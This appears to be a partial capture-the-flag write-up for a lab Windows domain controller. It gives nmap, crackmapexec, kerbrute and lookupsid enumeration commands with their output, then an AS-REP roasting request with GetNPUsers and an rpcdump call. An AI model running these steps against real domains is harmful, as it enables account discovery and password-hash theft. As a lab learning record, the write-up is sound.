# proxychallenge

## Reconnaice
```bash
silent-scan $TARGET
nmap -sVC  -p88,593,49670 $TARGET -oN service
```
**Output**
```text
PORT      STATE SERVICE      VERSION
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-06-11 07:59:21Z)
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49670/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

## Windows Enumeration 
```bash
crackmapexec smb $TARGET
```
**Output**
```
SMB         10.128.169.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ctf.local) (signing:True) (SMBv1:False)
```
### Name of the domain ctf.local add it to /etc/hosts

### Perform kerbrute user enumeration
```bash
kerbrute userenum -d ctf.local /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt --dc $TARGET
```

### RID Brute Force (lookupsid)
```bash
lookupsid.py anonymous@$TARGET | grep "SidTypeUser" | awk '{print $2}' | cut -d'\' -f2 > users.txt

```

**Output**
```
Administrator
Guest
krbtgt
DC01$
svc.scanner
svc.mssql
helpdesk.bob
it.admin
```

### Let's try to get a TGT 
```bash
GetNPUsers.py ctf.local/ -dc-ip $TARGET -usersfile usuarios.txt -request -outputfile hashes.txt
```

### Enumerate endpoints RCP HTTP
```bash
rpcdump.py $TARGET -p 593 > endpoints-593.txt
```